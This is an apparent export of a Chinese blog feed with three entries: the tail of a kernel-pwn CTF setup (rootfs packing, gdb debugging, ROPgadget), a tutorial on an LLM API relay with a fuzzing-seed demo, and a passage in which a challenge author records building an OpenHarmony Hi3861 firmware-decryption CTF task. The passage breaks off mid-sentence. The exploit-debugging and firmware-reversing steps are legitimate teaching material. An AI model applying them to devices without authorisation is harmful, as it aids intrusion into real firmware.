<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rootfs 打包</span></span><br><span class="line">pushd rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line">popd</span><br></pre></td></tr></table></figure>
<p>gdb调试脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb ./vmlinux</span><br><span class="line">target remote localhost:1234</span><br><span class="line">c</span><br><span class="line">add-symbol-file babydriver.ko 0xffffffffc0000000</span><br><span class="line">b babyopen</span><br><span class="line">c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>gadget获取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>国内GPT中转配置方案</title>
    <url>/posts/eee3f851.html</url>
    <content><![CDATA[<h2 id="国内GPT中转配置方案"><a href="#国内GPT中转配置方案" class="headerlink" title="国内GPT中转配置方案"></a>国内GPT中转配置方案</h2><p><strong>官网主页</strong>：<a href="https://api.bianxie.ai/">https://api.bianxie.ai/</a></p>
<p>软件&#x2F;代码&#x2F;插件接入使用便携AI聚合API需要两个数据：</p>
<ol>
<li><strong>BASE_URL</strong>：有的软件里也叫API URL或者OPENAI_API_BASE，都是一个意思，就是说你从这个链接调用服务；</li>
<li><strong>API Key</strong>：就是令牌，以sk-开头的一长串字符。</li>
</ol>
<p><strong>客户端工具</strong>：<a href="https://github.com/Dooy/chatgpt-web-midjourney-proxy">https://github.com/Dooy/chatgpt-web-midjourney-proxy</a></p>
<p>配置BASE_URL和API_KEY即可直接使用</p>
<h2 id="GPT-API使用参考模版"><a href="#GPT-API使用参考模版" class="headerlink" title="GPT API使用参考模版"></a>GPT API使用参考模版</h2><p>以一个调用LLM读取报文协议生成模糊测试初始化种子的demo为例</p>
<p>文件目录树：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree                          </span><br><span class="line">.</span><br><span class="line">├── config</span><br><span class="line">│   ├── config.yaml</span><br><span class="line">│   └── prompts</span><br><span class="line">│       ├── generate_seeds.txt</span><br><span class="line">│       └── packet</span><br><span class="line">└──  llm_generate_seeds.py</span><br></pre></td></tr></table></figure>

<p>模版代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeedsGenerator</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;种子生成器，用于生成相关服务协议的初始化种子&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, config_path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化种子生成器</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            config_path: 配置文件路径</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 加载配置</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(config_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.config = yaml.safe_load(f)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 设置OpenAI API</span></span><br><span class="line">        <span class="variable language_">self</span>.client = openai.OpenAI(</span><br><span class="line">            api_key=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;api_key&#x27;</span>],</span><br><span class="line">            base_url=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;base_url&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 加载提示词模板</span></span><br><span class="line">        prompt_dir = os.path.join(os.path.dirname(config_path), <span class="string">&#x27;prompts&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(prompt_dir, <span class="string">&#x27;packet&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.packet_prompt = f.read()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 加载提示词模板</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(prompt_dir, <span class="string">&#x27;generate_seeds.txt&#x27;</span>), <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.analyze_prompt = f.read()</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 设置日志记录器</span></span><br><span class="line">        <span class="variable language_">self</span>.logger = logging.getLogger(<span class="string">&#x27;SeedsGenerator&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.logger.handlers:</span><br><span class="line">            handler = logging.StreamHandler()</span><br><span class="line">            formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">            handler.setFormatter(formatter)</span><br><span class="line">            <span class="variable language_">self</span>.logger.addHandler(handler)</span><br><span class="line">            <span class="variable language_">self</span>.logger.setLevel(logging.INFO)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_seeds</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        生成初始化种子</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            初始化种子，保存在seeds目录下</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 构建提示词</span></span><br><span class="line">            prompt = <span class="variable language_">self</span>.analyze_prompt.<span class="built_in">format</span>(</span><br><span class="line">                packet = <span class="variable language_">self</span>.packet_prompt</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 调用OpenAI API</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">self</span>.logger.info(<span class="string">&quot;生成初始化种子...&quot;</span>)</span><br><span class="line">            response = <span class="variable language_">self</span>.client.chat.completions.create(</span><br><span class="line">                model=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;model&#x27;</span>],</span><br><span class="line">                messages=[</span><br><span class="line">                    &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个专业的模糊测试专家。请严格按照指定格式输出结果。&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;</span><br><span class="line">                ],</span><br><span class="line">                temperature=<span class="number">0.3</span></span><br><span class="line">            )</span><br><span class="line">             </span><br><span class="line">            <span class="comment"># 解析响应</span></span><br><span class="line">            result = response.choices[<span class="number">0</span>].message.content</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 解析分析结果</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;seeds&quot;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&quot;seeds&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;seeds/seed_llm&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(result.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="variable language_">self</span>.logger.info(<span class="string">&quot;初始化种子生成成功，保存在seeds/seed_llm&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.logger.error(<span class="string">f&quot;分析报文时发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.logger.error(traceback.format_exc())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 初始化种子生成器</span></span><br><span class="line">    generator = SeedsGenerator(<span class="string">&#x27;./config/config.yaml&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成初始化种子</span></span><br><span class="line">    seeds = generator.generate_seeds()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>使用的话直接在<code>config/config.yaml</code>里添加各类参数，<code>config/prompts</code>添加提示词即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deepseek:</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">&quot;sk-XXXXXXXXXXXXXXXXXXXXXXXX&quot;</span></span><br><span class="line">  <span class="attr">base_url:</span> <span class="string">&quot;https://api.deepseek.com&quot;</span></span><br><span class="line">  <span class="attr">model:</span> <span class="string">&quot;deepseek-chat&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>鸿蒙CTF出题</title>
    <url>/posts/33a951e6.html</url>
    <content><![CDATA[<p>很荣幸能给鸿蒙CTF出题，最近一直在忙别的活，因此出题有不足的地方请见谅。。。<br>（听说决赛上一开始没给固件然后大家都卡在了提固件上，出题人就情不自禁地轻哼起来XD</p>
<blockquote>
<p>以下为出题过程的记录总结，可能思路存在跳跃、逻辑不清晰、前后不一致等问题，请各位师傅见谅</p>
</blockquote>
<h2 id="1-出题思路"><a href="#1-出题思路" class="headerlink" title="1. 出题思路"></a>1. 出题思路</h2><p>在openharmony的系统内存放了升级包固件的解密程序，即已获得旧版本固件shell（或者说有能力获取shell），需要利用升级程序中的解密程序解包更新后的加密固件。flag则打包存放在更新加密固件中。</p>
<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><p><strong>使用的工具和环境</strong></p>
<ul>
<li>Windows 11</li>
<li>Ubuntu 20.04</li>
<li>Visual Studio Code</li>
<li>DevEco Device Tool</li>
<li>小熊派Hi3861开发板</li>
</ul>
<h3 id="0x01-搭建开发环境（Windows）"><a href="#0x01-搭建开发环境（Windows）" class="headerlink" title="0x01 搭建开发环境（Windows）"></a>0x01 搭建开发环境（Windows）</h3><p>下载安装<a href="https://device.harmonyos.com/cn/develop/ide#download">DevEco Device Tool</a>，这里使用了Windows版，当然linux版更通用，Windows上只能适配Hi3861（建议用linux版，linux可以下载openharmony源码，功能更加完善；并且windows上的迁移并不完全，有些命令还是linux格式…）。<br>安装过程遇到不存在python3.8环境的话直接选择自定义安装即可，不需要添加环境变量，也不需要删除其他python环境，直接安装即可。<br>安装完成后打开Vscode，可以发现左侧自动添加了DevEco Device Tool扩展。</p>
<img src="/posts/33a951e6/image-20250711133507670.png" class="" title="image-20250711133507670">

<h3 id="0x02-搭建开发环境（Linux）"><a href="#0x02-搭建开发环境（Linux）" class="headerlink" title="0x02 搭建开发环境（Linux）"></a>0x02 搭建开发环境（Linux）</h3><p>该部分比较简单，为方便直接安装ubuntu20.04虚拟机。</p>
<ol>
<li>将shell环境修改为bash</li>
<li>下载并安装DevEco Device Tool最新安装包</li>
<li>安装ssh服务</li>
<li>后面创建时有一些傻瓜式引导，就不细致列出来了</li>
</ol>
<h3 id="0x03-创建demo项目"><a href="#0x03-创建demo项目" class="headerlink" title="0x03 创建demo项目"></a>0x03 创建demo项目</h3><p>选择<code>New Project</code>，填写配置，其中如果sdk下载报错<a href="mailto:&#x68;&#x69;&#x33;&#x38;&#54;&#49;&#95;&#104;&#x64;&#x75;&#95;&#x69;&#111;&#x74;&#64;&#49;&#46;&#48;&#x2e;&#48;">&#x68;&#x69;&#x33;&#x38;&#54;&#49;&#95;&#104;&#x64;&#x75;&#95;&#x69;&#111;&#x74;&#64;&#49;&#46;&#48;&#x2e;&#48;</a>和<a href="mailto:&#68;&#x65;&#x76;&#84;&#x6f;&#x6f;&#x6c;&#115;&#95;&#x48;&#x69;&#x33;&#x38;&#x36;&#49;&#86;&#x31;&#48;&#48;&#64;&#x31;&#46;&#x30;&#46;&#x30;">&#68;&#x65;&#x76;&#84;&#x6f;&#x6f;&#x6c;&#115;&#95;&#x48;&#x69;&#x33;&#x38;&#x36;&#49;&#86;&#x31;&#48;&#48;&#64;&#x31;&#46;&#x30;&#46;&#x30;</a>安装失败。可以按以下链接下载两个压缩包。<br>然后解压<code>hi3861_hdu_iot_application</code>手动复制到<code>path/to/DevEco/resources/sdk/cfbb/hi3861_hdu_iot/</code>中，文件夹需要重命名为1.0.0；<code>DevTools_Hi3861</code>同理放在<code>path/to/DevEco/resources/toolset/DevTools_Hi3861V100/</code></p>
<ul>
<li><a href="https://gitee.com/HiSpark/hi3861_hdu_iot_application/repository/archive/master.zip">hi3861_hdu_iot_application</a></li>
<li><a href="%5Bhttps://hispark-obs.obs.cn-east-3.myhuaweicloud.com/DevTools_Hi3861V100_v1.0.zip%5D(https://gitee.com/link?target=https://hispark-obs.obs.cn-east-3.myhuaweicloud.com/DevTools_Hi3861V100_v1.0.zip)">DevTools_Hi3861V100</a><img src="/posts/33a951e6/image-20250711141055803.png" class="" title="image-20250711141055803"></li>
</ul>
<p>此时应显示SDK已安装：</p>
<img src="/posts/33a951e6/image-20250711141113721.png" class="" title="image-20250711141113721">

<p>创建完成后查看README可以发现有比较详细的教程。我们选择看官方以及里面引用的小熊派的文档。</p>
<h3 id="0x05-编译"><a href="#0x05-编译" class="headerlink" title="0x05 编译"></a>0x05 编译</h3><p>然后尝试先编译一下：<br>报错：riscv32-unknown-elf-gcc.exe:fatal error:no input files</p>
<img src="/posts/33a951e6/16675773cf554651b379975b31d7d0eb.20230403061144.502597833507714710299459998186725054042709222924007A598FD476C5879308D8BF628173089325817AFCCC2EB8DAA405B308F5C7568C.png" class="" title="编译Hi3861问题解决方法汇总FAQ-Windows-鸿蒙开发者社区">

<p>换一个短点的路径作为项目根目录，成功编译</p>
<img src="/posts/33a951e6/image-20250711163433750.png" class="" title="image-20250711163433750">

<p>编译完成的固件在<code>./src/out/</code>目录下</p>
<h3 id="0x06-烧录"><a href="#0x06-烧录" class="headerlink" title="0x06 烧录"></a>0x06 烧录</h3><p>硬件连接电脑, 如电脑未安装CH340G驱动, 先安装<code>DevTools_Hi3861V100_v1.0/usb_serial_driver</code>路径下的CH341SER.EXE串口驱动. 然后点击左侧“工程配置”, 找到“upload_port”选项, 选择开发板对应的烧录串口进行烧录。选择后点击Upload即可</p>
<img src="/posts/33a951e6/image-20250711164527086.png" class="" title="image-20250711164527086">

<p>烧录前还有个led在亮，烧完后led都没了hhh</p>
<h3 id="0x07-Monitor串口打印"><a href="#0x07-Monitor串口打印" class="headerlink" title="0x07 Monitor串口打印"></a>0x07 Monitor串口打印</h3><p>通过Monitor界面查看串口打印，在Project Settings中配置monitor_port。</p>
<p>点击Monitor，复位开发板，打印了一些信息</p>
<img src="/posts/33a951e6/image-20250711170235036.png" class="" title="image-20250711170235036">

<h3 id="0x08-hello-world"><a href="#0x08-hello-world" class="headerlink" title="0x08 hello world"></a>0x08 hello world</h3><p>按照前面新建项目中提供的pdf。实现一个打印”hello world!”信息的功能</p>
<img src="/posts/33a951e6/image-20250711174414069.png" class="" title="image-20250711174414069">

<h2 id="3-前置问题"><a href="#3-前置问题" class="headerlink" title="3. 前置问题"></a>3. 前置问题</h2><p>有一些问题需要先解决才能出题</p>
<h3 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a>0x01 获取shell</h3><p>在<code>/src/device/hisilicon/hispark_pegasus/sdk_liteos/app/wifiiot_app/src/app_main.c</code>路径中添加#define ENABLE_SHELL_DEBUG定义开启shell初始化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ENABLE_SHELL_DEBUG</span></span><br><span class="line"></span><br><span class="line">hi_void <span class="title function_">testcmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;testcmd&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hi_void <span class="title function_">app_main</span><span class="params">(hi_void)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    hi_shell_set_task_size(<span class="number">0x900</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">    hi_u32 shell_status = hi_shell_init();</span><br><span class="line">    hi_shell_cmd_register(<span class="string">&quot;testcmd&quot;</span>, &amp;testcmd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shell_status : %d\r\n&quot;</span>, shell_status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>串口0默认是AT指令，但是正常发送命令会报ERROR（不知道是什么问题）：</p>
<img src="/posts/33a951e6/image-20250713181429221.png" class="" title="image-20250713181429221">

<p>设置<code>AT+SETUART=1,0,2</code>后，串口0变为调试串口，获得shell</p>
<img src="/posts/33a951e6/image-20250713183917000.png" class="" title="image-20250713183917000">

<p>没有什么命令，testcmd是自己注册的，所以大部分都需要自己实现。</p>
<blockquote>
<p>网上文章说shell开启在串口1（GPIO5,6）上。项目文档里说在串口0（GPIO3，4）。<br><em>其实文档里是错的，默认应该是串口0对应AT命令；串口1对应shell命令行；都有点问题，后续有时间需要再研究一下。</em></p>
<p>复现了一波，发现是在连IO3-USB_RXD，IO4-USB_TXD时可以成功执行AT命令，执行<code>AT+SETUART=1,0,2</code>后，串口0变成shell命令行，可以执行命令。</p>
<img src="/posts/33a951e6/image-20250713183311362.png" class="" title="image-20250713183311362">
</blockquote>
<h3 id="0x02-固件格式逆向"><a href="#0x02-固件格式逆向" class="headerlink" title="0x02 固件格式逆向"></a>0x02 固件格式逆向</h3><img src="/posts/33a951e6/image-20250712121450375.png" class="" title="image-20250712121450375">

<p>找到Menuconfig了，位于<code>/src/device/hisilicon/hispark_pegadsus/sdk_liteos/tools/menuconfig/usr_config.mk</code><br>OTA相关设置如下，开启了Compression OTA SUPPORT，对于生成的OTA文件会进行lzma压缩：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># OTA Settings</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">CONFIG_COMPRESSION_OTA_SUPPORT=y</span></span><br><span class="line"><span class="comment"># CONFIG_DUAL_PARTITION_OTA_SUPPORT is not set</span></span><br><span class="line"><span class="comment"># end of OTA Settings</span></span><br></pre></td></tr></table></figure>

<p>编译后out目录下文件内容，其中存在可执行文件、烧录文件、OTA升级文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── Hi3861_boot_signed.bin</span><br><span class="line">├── Hi3861_boot_signed_B.bin</span><br><span class="line">├── Hi3861_loader_signed.bin</span><br><span class="line">├── Hi3861_wifiiot_app.asm</span><br><span class="line">├── Hi3861_wifiiot_app.map</span><br><span class="line">├── Hi3861_wifiiot_app.out</span><br><span class="line">├── Hi3861_wifiiot_app_allinone.bin</span><br><span class="line">├── Hi3861_wifiiot_app_burn.bin</span><br><span class="line">├── Hi3861_wifiiot_app_flash_boot_ota.bin</span><br><span class="line">├── Hi3861_wifiiot_app_ota.bin</span><br><span class="line">├── Hi3861_wifiiot_app_vercfg.bin</span><br><span class="line">├── args.gn</span><br><span class="line">├── build.log</span><br><span class="line">├── build.ninja</span><br><span class="line">├── build.ninja.d</span><br><span class="line">├── error.log</span><br><span class="line">├── etc</span><br><span class="line">├── libs</span><br><span class="line">├── obj</span><br><span class="line">└── toolchain.ninja</span><br><span class="line"></span><br><span class="line">3 directories, 17 files</span><br></pre></td></tr></table></figure>

<p>逆向.&#x2F;build目录下编译脚本，在.&#x2F;build&#x2F;win_scripts&#x2F;SConstruct.py文件中定义有各类的打包格式，其中app_ota.bin为lzma压缩后的bin文件<br>解压后的app_ota.bin内部存放了部分程序代码，该部分为app_burn.bin的后半部分也就是app的主要代码逻辑。理论上是可以用ida或ghidra进行分析的，但是这里其实没有必要，因为只需要逆向原固件的代码升级逻辑，也就是提供的app_burn.bin文件。</p>
<img src="/posts/33a951e6/image-20250715154527968.png" class="" title="image-20250715154527968">

<h3 id="0x03-能否从allinone-bin中恢复出代码逻辑"><a href="#0x03-能否从allinone-bin中恢复出代码逻辑" class="headerlink" title="0x03 能否从allinone.bin中恢复出代码逻辑"></a>0x03 能否从allinone.bin中恢复出代码逻辑</h3><p><code>&#123;&#125;_app.out</code>文件中存在各个符号地址，其中存在ota（也就是主要代码逻辑位置的<code>.text_non_rom</code>段定义0x40d3c0）的所有符号定义。可以用于符号恢复。也就是说可以使用ida或者ghidra脚本恢复出目标函数位置。</p>
<p>解题方法：</p>
<ul>
<li>从allinone.bin中提取出app_burn.bin文件</li>
<li>从app_burn.bin中获取elf程序主要代码逻辑</li>
<li>根据app.map文件恢复符号</li>
<li>分析ohota命令实现的升级功能内部的解密逻辑，解密升级包updater.bin</li>
<li>解压updater.bin，flag明文存储在updater.bin中</li>
</ul>
<h3 id="0x04-OTA升级"><a href="#0x04-OTA升级" class="headerlink" title="0x04 OTA升级"></a>0x04 OTA升级</h3><p>目前看到OpenHarmony提供的一种方式，<a href="https://gitee.com/openharmony/update_ota_lite">OTA（Over The Air）</a>。</p>
<p><a href="https://docs.openharmony.cn/pages/v5.0/zh-cn/device-dev/subsystems/subsys-ota-guide.md">子系统开发-OTA升级</a></p>
<p>问题是如何在Hi3861上进行实现，目标是一个RTOS开发板，针对RTOS系统的升级方式应该和<a href="https://bbs.kanxue.com/thread-281043.htm">Dlink</a>的这个例子具体内容不同，可能会影响后续的出题方式。</p>
<h4 id="1-生成公私钥对"><a href="#1-生成公私钥对" class="headerlink" title="1. 生成公私钥对"></a>1. 生成公私钥对</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">generate pubkey&amp;privatekey RSA,2048bits</span></span><br><span class="line">openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048</span><br><span class="line">openssl rsa -pubout -in private_key.pem -out signing_cert.crt</span><br></pre></td></tr></table></figure>

<p>下载<a href="https://gitee.com/openharmony/update_packaging_tools">升级包制作工具</a>，将公钥放入<code>packaging_tools/sign_cert/</code>，私钥作为制作命令参数带入，用于升级包签名，公钥用于升级时对升级包进行签名校验。公钥的放置如下：</p>
<ul>
<li>在轻量（我们要用的hi3861）和小型系统将生成的公钥内容预置在代码中，需要厂商实现<code>HotaHalGetPubKey</code>接口来获取公钥。</li>
<li>标准系统需要将生成公钥放在device或vendor目录下的<code>/hisilicon/hi3516dv300/build/updater_config/signing_cert.crt</code>这个文件中</li>
</ul>
<p>在hi3861中查看HotaHalGetPubKey实现，发现公钥内容硬编码在<code>g_pubKeyBuf</code>变量中，定义在<code>/src/device/hisilicon/hispark_ppegasus/hi3861_adapter/hals/update/hal_hota_board.c</code>文件下（暂时先不改了，反正后面用不到）。</p>
<img src="/posts/33a951e6/image-20250711214251439.png" class="" title="image-20250711214251439">

<h4 id="2-制作升级包"><a href="#2-制作升级包" class="headerlink" title="2. 制作升级包"></a>2. 制作升级包</h4><p><a href="https://gitee.com/openharmony/update_packaging_tools">升级包制作工具</a><br>仅考虑<strong>轻量以及小型系统升级包制作</strong>情况<br>配置文件<code>/updater_config/updater_specified_config.xml</code>内容设置：</p>
<figure class="highlight xml"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span> <span class="attr">name</span>=<span class="string">&quot;Component header information&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">info</span> <span class="attr">fileVersion</span>=<span class="string">&quot;02&quot;</span> <span class="attr">prdID</span>=<span class="string">&quot;hitopia&quot;</span> <span class="attr">softVersion</span>=<span class="string">&quot;OpenHarmony x.x&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1145.14.11&quot;</span> <span class="attr">time</span>=<span class="string">&quot;45:14:11&quot;</span>&gt;</span>head info<span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;Component information&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component</span> <span class="attr">compAddr</span>=<span class="string">&quot;app&quot;</span> <span class="attr">compId</span>=<span class="string">&quot;25&quot;</span> <span class="attr">resType</span>=<span class="string">&quot;5&quot;</span> <span class="attr">compType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">compVer</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span>Hi3861_wifiiot_app_ota.bin<span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接把编译好out目录里的ota.bin文件扔给打包工具（</p>
<img src="/posts/33a951e6/image-20250712204111388.png" class="" title="image-20250712204111388">

<p>在项目内有一个测试ota数据在目录<code>/base/update/ota_lite/frameworks/test/unittest/common/src/ota_test.cpp</code>中定义变量<code>g_otaPkg</code></p>
<img src="/posts/33a951e6/image-20250714172255541.png" class="" title="image-20250714172255541">

<p>直接硬编码了一段合法的ota.bin升级包。与上面打包的格式基本对应，因此可以验证有效性。<br>ota应该就是需要是压缩后的直接传入，因为配置了<code>CONFIG_COMPRESSION_OTA_SUPPORT</code>选项：<br>在<code>src/device/hisilicon/hispark_pegasus/sdk_liteos/boot/flashboot/upg/boot_start.c</code>文件的<code>boot_head</code>函数内包含相关逻辑：</p>
<figure class="highlight c"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_COMPRESSION_OTA_SUPPORT)</span></span><br><span class="line">    <span class="keyword">if</span> ((ret == HI_ERR_SUCCESS) &amp;&amp; (g_upg_kernel_verify_addr == cfg-&gt;addr_write)) &#123;</span><br><span class="line">        ret = boot_upg_kernel_process(cfg-&gt;addr_start, cfg-&gt;addr_write);</span><br><span class="line">        <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">            boot_msg2(<span class="string">&quot;[bootupg kernel process]ret-addr_start&quot;</span>, ret, cfg-&gt;addr_start);</span><br><span class="line">            global_reset();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLASH_ENCRYPT_SUPPORT</span></span><br><span class="line">        ret = crypto_decrypt(KERNEL_RAM_ADDR, CRYPTO_KERNEL_LENGTH);</span><br><span class="line">        <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">            global_reset();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        ret = boot_upg_check_file(cfg-&gt;addr_start);</span><br><span class="line">        <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">            global_reset();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>当开启<code>CONFIG_COMPRESSION_OTA_SUPPORT</code>配置时，会调用boot_upg_kernel_process函数，函数逻辑如下：</p>
